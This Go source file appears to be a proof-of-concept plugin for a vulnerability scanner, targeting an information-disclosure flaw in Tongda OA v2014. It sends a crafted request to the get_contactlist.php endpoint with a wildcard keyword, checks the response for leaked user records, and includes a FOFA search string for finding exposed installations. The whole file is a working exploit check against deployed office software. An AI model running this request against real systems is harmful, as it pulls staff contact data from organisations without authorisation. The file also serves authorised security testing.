package main

import (
	"encoding/json"
	"errors"
	"github.com/ExpLangcn/HwToolslibrary/library/httpclient"
	"github.com/ExpLangcn/HwToolslibrary/library/info"
	"net/http"
)

var POC info.POC
var Httprecord = make(map[*httpclient.RequestOptions]*httpclient.Response) // 配置请求信息

func init() {
	POC = info.POC{ // 初始化POC信息
		Info: info.POCInfo{
			Name:     "通达OA v2014 敏感信息泄漏漏洞",
			Author:   "ExpLang",
			Describe: "通达OA v2014 存在信息泄漏漏洞，攻击者通过漏洞可以获取敏感信息，进一步攻击。",
			Date:     "2023-09-26",
			Tags:     []string{"通达OA", "TongdaOA", "Sensitive Info"},
			Level:    "medium",
			Link:     []string{"https://peiqi.h-k.pw/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2014%20get_contactlist.php%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.html"},
		},
		Other: info.OtherInfo{
			FOFAGrammar:  "app=\"TDXK-通达OA\"",
			QuakeGrammar: "",
		},
	}
}

func Start(Target string, ProxyURL string) (bool, error) {
	// 定义请求选项
	requestOption := &httpclient.RequestOptions{
		Method: http.MethodGet,
		URL:    Target + "/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3",
		Headers: map[string]string{
			"User-Agent": httpclient.RandomUserAgent(),
		},
		ProxyURL: ProxyURL,
	}

	// 发送请求
	responseOption, success := httpclient.SendRequest(*requestOption)
	Httprecord[requestOption] = responseOption

	if responseOption.Err != nil {
		// 处理错误
		return false, responseOption.Err
	} else {
		if !success {
			// 发送请求失败
			return false, errors.New("请求失败")
		}
	}

	POC.Info.HttpInfo = Httprecord

	statusCode := responseOption.StatusCode
	if statusCode == http.StatusOK {
		// 检查响应是否为JSON
		var responseData []map[string]interface{}
		err := json.Unmarshal(responseOption.Body, &responseData)
		if err != nil {
			return false, nil
		}

		// 检查是否存在"user_uid"字段
		for _, item := range responseData {
			if _, ok := item["user_uid"]; ok {
				return true, nil
			}
		}
	}
	return false, nil
}
